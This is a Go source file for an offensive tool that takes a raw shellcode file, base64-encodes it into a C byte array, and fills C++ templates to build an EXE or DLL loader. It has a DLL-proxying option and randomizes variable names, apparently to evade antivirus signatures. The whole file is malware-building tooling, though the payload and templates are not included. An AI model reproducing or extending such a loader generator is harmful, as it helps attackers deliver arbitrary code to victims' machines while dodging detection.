package main

import (
	"bytes"
	b64 "encoding/base64"
	"flag"
	"fmt"
	"io/ioutil"
	"math/rand"
	"os"
	"path/filepath"
	"strings"
	"text/template"
	"time"
)

var (
	inputFile    string
	inputDLL     string
	outputFormat string
	arch         int

	seededRand *rand.Rand
	err        error
)

const (
	BuildDir    = "./build"
	TemplateDir = "./templates"
)

type TemplateVars struct {
	Shellcode    string
	ShellcodeLen int
	Format       string
	Architecture string
	V            map[string]string
}

func init() {
	flag.StringVar(&inputFile, "i", "", "Shellcode file")
	flag.StringVar(&outputFormat, "f", "exe", "Executable format: dll, exe")
	flag.StringVar(&inputDLL, "proxy-dll", "", "DLL to proxy functions to")

	flag.Parse()

	if inputFile == "" {
		fmt.Println("Input file required")
		os.Exit(0)
	}

	outputFormat = strings.ToLower(outputFormat)

	seededRand = rand.New(rand.NewSource(time.Now().UnixNano()))
}

func main() {
	encodedFile, err := encodeFileB64(inputFile)
	if err != nil {
		panic(err)
	}

	vNameMin := 3
	vNameMax := 7
	vNames := map[string]string{
		"main":         genVarName(vNameMin, vNameMax),
		"shellcode":    genVarName(vNameMin, vNameMax),
		"shellcodeLen": genVarName(vNameMin, vNameMax),
		// "shellcode": genVarName(vNameMin, vNameMax),
		// "shellcode": genVarName(vNameMin, vNameMax),
		// "shellcode": genVarName(vNameMin, vNameMax),
		// "shellcode": genVarName(vNameMin, vNameMax),
		// "shellcode": genVarName(vNameMin, vNameMax),
		// "shellcode": genVarName(vNameMin, vNameMax),
		// "shellcode": genVarName(vNameMin, vNameMax),
		// "shellcode": genVarName(vNameMin, vNameMax),
		// "shellcode": genVarName(vNameMin, vNameMax),
	}
	sc := TemplateVars{
		Format: outputFormat,
		V:      vNames,
	}
	cShellcode := ""

	for i, b := range encodedFile {
		cShellcode += fmt.Sprintf("0x%x, ", b)
		if (i+1)%12 == 0 {
			cShellcode += "\n  "
		}
	}
	sc.Shellcode = cShellcode
	sc.ShellcodeLen = len(encodedFile)

	templateFiles := []string{
		"shellcode.h.tml",
		"main.cpp.tml",
		"util.cpp.tml",
		"util.h.tml",
	}

	for _, t := range templateFiles {
		err = generateTemplate(fmt.Sprintf("%s/%s", TemplateDir, t), sc)
		if err != nil {
			panic(err)
		}
	}

}

func encodeFileB64(fileName string) (string, error) {
	fBytes, err := ioutil.ReadFile(fileName)
	if err != nil {
		return "", err
	}

	encodedFile := b64.StdEncoding.EncodeToString(fBytes)
	if err != nil {
		return "", err
	}

	return encodedFile, nil
}

func generateTemplate(templatePath string, tVars TemplateVars) error {
	tBytes, err := fillTemplate(templatePath, tVars)
	if err != nil {
		return err
	}

	outFile := filepath.Base(templatePath)
	outFile = strings.TrimSuffix(outFile, ".tml")

	err = saveFile(fmt.Sprintf("%s/%s", BuildDir, outFile), tBytes.Bytes())
	if err != nil {
		return err
	}

	return nil
}

func saveFile(fileName string, fileBytes []byte) error {
	err := ioutil.WriteFile(fileName, fileBytes, 0644)
	if err != nil {
		return err
	}

	return nil
}

func fillTemplate(templatePath string, tVars TemplateVars) (bytes.Buffer, error) {
	tmpl, err := template.ParseFiles(templatePath)
	if err != nil {
		return bytes.Buffer{}, err
	}

	fileBytes := new(bytes.Buffer)
	err = tmpl.Execute(fileBytes, tVars)
	if err != nil {
		return bytes.Buffer{}, err
	}

	return *fileBytes, nil
}

// Generate random variable name
func genVarName(min, max int) string {
	charset := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	l := seededRand.Intn(max-min) + min
	b := make([]byte, l)

	for i := range b {
		b[i] = charset[seededRand.Intn(len(charset))]
	}

	return string(b)
}
